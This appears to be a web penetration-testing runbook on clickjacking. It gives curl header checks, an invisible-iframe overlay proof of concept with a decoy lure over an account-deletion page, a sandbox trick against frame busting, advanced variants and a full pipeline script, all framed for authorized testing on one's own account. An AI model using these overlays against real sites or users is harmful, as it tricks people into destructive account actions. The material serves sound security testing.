---
title: "Clickjacking"
description: "Exploiting missing X-Frame-Options or CSP frame-ancestors to overlay UI, bypass frame busting, and redressing clicks for sensitive actions."
phase: Web
order: 17
tags:
  - clickjacking
  - ui-redressing
  - http-headers
  - csp
tools:
  - curl
  - burp suite
updated: 2026-10-01
---

A runbook for authorized clickjacking testing on **in-scope** targets. Goal: prove a sensitive, state-changing action can be triggered through a framed overlay, using your own account.

## 1. Check the framing headers

```bash
for p in / /settings /account/email /account/delete; do
  echo "== $p"
  curl -sI "https://target$p" | grep -iE 'x-frame-options|content-security-policy'
done
```

If neither `X-Frame-Options` (DENY/SAMEORIGIN) nor `CSP: frame-ancestors` is present on a sensitive page, it can likely be framed.

## 2. Confirm framing works

Build a minimal page that frames the target and check whether the browser renders it.

```html
<!doctype html>
<iframe src="https://target/settings" width="800" height="600"></iframe>
```

If DevTools reports `Refused to display ... in a frame`, framing is blocked. Otherwise, proceed.

## 3. Build an overlay PoC

Align a decoy under an invisible iframe so the victim clicks the real control.

```html
<!doctype html>
<style>
  iframe { position:relative; width:800px; height:600px; opacity:0.0001; z-index:2; }
  .decoy { position:absolute; top:340px; left:220px; z-index:1; }
</style>
<div class="decoy">Claim your reward</div>
<iframe src="https://target/settings/delete"></iframe>
```

Tune opacity and offsets until you confirm alignment, then raise opacity for the demo.

## 4. Bypass frame busting

```html
<!-- sandbox without allow-scripts defeats JS frame busting -->
<iframe sandbox="allow-forms" src="https://target/action"></iframe>
```

Also look for a path that omits the framing header, and use `sandbox` to neutralize `onbeforeunload` prompts.

## 5. Advanced tricks

- **Double framing**: nest the target so naive `top != self` checks fail.
- **Cursorjacking**: shift the visible cursor so the click point is misread.
- **Drag-and-drop**: overlay an iframe over a draggable region to steal content.

## 6. Prove impact

Identify the action one click performs — change email, disable MFA, issue a payment, grant OAuth. A clickjacking report without a meaningful target action is low value. Test only on your own account.

## Full pipeline

```bash
# 1. Header check on sensitive endpoints
for p in / /settings /account/email /account/delete; do
  echo "== $p"; curl -sI "https://target$p" | grep -iE 'x-frame-options|content-security-policy'
done

# 2. Framing test page
cat > poc.html <<'HTML'
<!doctype html>
<style>
  iframe { position:relative; width:800px; height:600px; opacity:0.0001; z-index:2; }
  .decoy { position:absolute; top:340px; left:220px; z-index:1; }
</style>
<div class="decoy">Claim your reward</div>
<iframe sandbox="allow-forms" src="https://target/settings/delete"></iframe>
HTML

# 3. Serve it and open in a browser, align the click, then capture evidence
python3 -m http.server 8000
```

## Ethics & legality

- Only test targets within an authorized scope and only with accounts you own.
- Never trick real users into clicking; demonstrate the overlay against your own session.
- Capture the header output, the PoC, and the resulting action as evidence.
